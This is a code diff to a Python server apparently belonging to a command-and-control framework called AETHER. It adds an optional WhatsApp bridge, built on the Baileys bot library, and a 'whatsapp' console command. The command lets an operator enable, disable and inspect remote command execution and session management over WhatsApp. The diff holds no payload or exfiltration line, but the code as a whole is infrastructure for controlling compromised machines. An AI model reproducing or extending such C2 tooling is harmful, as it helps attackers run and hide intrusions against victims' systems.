@@ -18,6 +18,13 @@ from crypto import CryptoHandler
 from sessions import SessionManager
 from commands.command_suite import AetherCommandSuite
 
+# Import WhatsApp integration (optional)
+try:
+    from comms import WhatsAppIntegration, WHATSAPP_CONFIG
+    WHATSAPP_AVAILABLE = True
+except ImportError:
+    WHATSAPP_AVAILABLE = False
+
 class AetherServer:
     def __init__(self, host='0.0.0.0', port=443):
         self.host = host
@@ -32,6 +39,11 @@ class AetherServer:
         
         # Load configuration
         self.config = self.load_config()
+        
+        # Initialize WhatsApp integration
+        self.whatsapp = None
+        if WHATSAPP_AVAILABLE:
+            self.whatsapp = WhatsAppIntegration(WHATSAPP_CONFIG)
         
         # Server banner
         self.banner = f"""{Fore.CYAN}
@@ -55,6 +67,7 @@ class AetherServer:
             'info': self.cmd_info,
             'config': self.cmd_config,
             'scan': self.cmd_scan,
+            'whatsapp': self.cmd_whatsapp,
         }
         
         # Interactive session commands (loaded when in session)
@@ -615,6 +628,78 @@ class AetherServer:
             print(f"{Fore.YELLOW}[*] No targets discovered")
         
         print(f"\n{Fore.GREEN}[+] Scan complete")
+    
+    def cmd_whatsapp(self, args):
+        """Manage WhatsApp C2 integration via Baileys bot."""
+        if not WHATSAPP_AVAILABLE:
+            print(f"{Fore.RED}[-] WhatsApp integration not available. Check comms module.")
+            return
+        
+        if not args:
+            print(f"{Fore.YELLOW}Usage: whatsapp <enable|disable|status|info|config>")
+            return
+        
+        action = args[0].lower()
+        
+        if action == 'enable':
+            if self.whatsapp and self.whatsapp.initialize(self.sessions, self.command_suite):
+                if self.whatsapp.start():
+                    print(f"{Fore.GREEN}[+] WhatsApp integration enabled")
+                    print(f"  Bridge: {self.whatsapp.bridge.bot_url if self.whatsapp.bridge else 'N/A'}")
+                else:
+                    print(f"{Fore.RED}[-] Failed to start WhatsApp listener")
+            else:
+                print(f"{Fore.RED}[-] Failed to initialize WhatsApp")
+        
+        elif action == 'disable':
+            if self.whatsapp:
+                self.whatsapp.stop()
+                print(f"{Fore.YELLOW}[-] WhatsApp integration disabled")
+        
+        elif action == 'status':
+            if self.whatsapp:
+                status = self.whatsapp.get_status()
+                print(f"{Fore.CYAN}\nWhatsApp Integration Status:")
+                for key, value in status.items():
+                    print(f"  {key}: {value}")
+        
+        elif action == 'info':
+            print(f"{Fore.CYAN}WhatsApp Bot Integration Info:")
+            print(f"  {Fore.YELLOW}Bot Framework: Baileys (Node.js)")
+            print(f"  {Fore.YELLOW}Location: WA-BOT-Base/")
+            print(f"  {Fore.YELLOW}Bot Files:")
+            print(f"    • aether-bridge.js - Bridge to AETHER")
+            print(f"    • aether-handler.js - Message routing")
+            print(f"    • aether-integration.js - Integration helpers")
+            print(f"  {Fore.YELLOW}Features:")
+            print(f"    • Session management via WhatsApp")
+            print(f"    • Remote command execution")
+            print(f"    • Command history tracking")
+            print(f"    • Authorized user whitelist")
+        
+        elif action == 'config':
+            if self.whatsapp and self.whatsapp.config:
+                print(f"\n{Fore.CYAN}WhatsApp Configuration:")
+                for key, value in self.whatsapp.config.items():
+                    if key not in ['webhook_secret']:
+                        if key == 'authorized_users':
+                            print(f"  {key}: {len(value)} users")
+                        else:
+                            print(f"  {key}: {value}")
+        
+        elif action == 'help':
+            help_text = """WhatsApp Integration Commands:
+  enable                      - Enable WhatsApp listener
+  disable                     - Disable WhatsApp listener
+  status                      - Show bridge status
+  info                        - Show integration info
+  config                      - Show configuration
+  help                        - Show this help"""
+            print(f"{Fore.CYAN}{help_text}")
+        
+        else:
+            print(f"{Fore.RED}[-] Unknown WhatsApp action: {action}")
+            print(f"{Fore.YELLOW}Use 'whatsapp help' for available commands")
 
 if __name__ == '__main__':
     import os
